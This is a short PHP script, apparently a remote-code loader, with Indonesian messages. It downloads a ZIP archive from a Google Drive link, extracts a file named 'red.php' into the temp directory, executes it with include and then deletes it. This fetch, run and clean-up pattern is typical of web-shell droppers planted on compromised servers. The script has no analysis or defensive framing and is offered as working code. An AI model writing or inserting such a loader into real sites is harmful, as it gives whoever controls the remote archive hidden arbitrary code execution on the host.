<?php

$zipFile = __DIR__ . '/dorm.zip';
$insideFile = 'folder/red.php';

// $downloadUrl = 'https://drive.usercontent.google.com/u/0/uc?id=1FSVKxEjJky84cHNliKZI6mqa_OUGiULq&export=download';
$downloadUrl = 'https://drive.usercontent.google.com/u/0/uc?id=188ZZJzCR8HcRPPdXeSDJ9_TYIo2Gbq_3&export=download';

if (!file_exists($zipFile)) {
    echo "ZIP belum ada, sedang download...\n";

    $fp = fopen($zipFile, 'w+');

    $ch = curl_init($downloadUrl);
    curl_setopt($ch, CURLOPT_FILE, $fp);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);

    curl_exec($ch);

    if (curl_errno($ch)) {
        fclose($fp);
        unlink($zipFile);
        die("Gagal download: " . curl_error($ch));
    }

    curl_close($ch);
    fclose($fp);

    echo "Download selesai.\n";
}

$zip = new ZipArchive;

if ($zip->open($zipFile) === TRUE) {
    $tempFile = tempnam(sys_get_temp_dir(), 'zip_');
    $zip->extractTo(dirname($tempFile), $insideFile);
    $realPath = dirname($tempFile) . '/' . $insideFile;
    include $realPath;
    unlink($realPath);
    $zip->close();
} else {
    echo "ZIP tidak bisa dibuka";
}
